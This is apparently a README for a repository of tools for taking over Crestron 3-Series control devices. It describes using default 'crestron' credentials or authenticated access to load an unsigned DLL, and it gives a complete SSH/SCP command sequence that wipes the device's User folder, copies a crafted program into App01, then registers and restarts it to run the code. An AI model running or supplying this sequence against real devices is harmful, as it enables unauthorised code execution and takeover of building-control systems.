# crestron
Tools for taking over Crestron 3-Series devices

If you have authenticated access, or the default `crestron` credentials are still enabled, you can use the above Simpl applications to load an unsigned DLL that will be executed when the program is (re)started with PROGRESET.

The DLL folder contains a Visual Studio 2008 project with a simple class. Recompiling the class and replacing the DLL.dll in the LPZ file of your choice (either in the file itself or after deployment) will set you up for success, hopefully.


```
mkdir tmp
cd tmp
unzip ../pro3.lpz
ssh crestron@192.168.1.240 del \\User\\*
scp * crestron@192.168.1.240:\\User
ssh crestron@192.168.1.240 copy \\User\\boot.bt \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\DLL.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa_archive.zip \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.bin \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.cdm \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\fdsa.rte \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SimplSharpCustomAttributesInterface.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SimplSharpData.dat \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SimplSharpHelperInterface.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SplusLibrary.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SplusManagerApp.exe \\Simpl\\App01\\
ssh crestron@192.168.1.240 copy \\User\\SplusObjects.dll \\Simpl\\App01\\
ssh crestron@192.168.1.240 progregister -P:all
ssh crestron@192.168.1.240 progreset

```
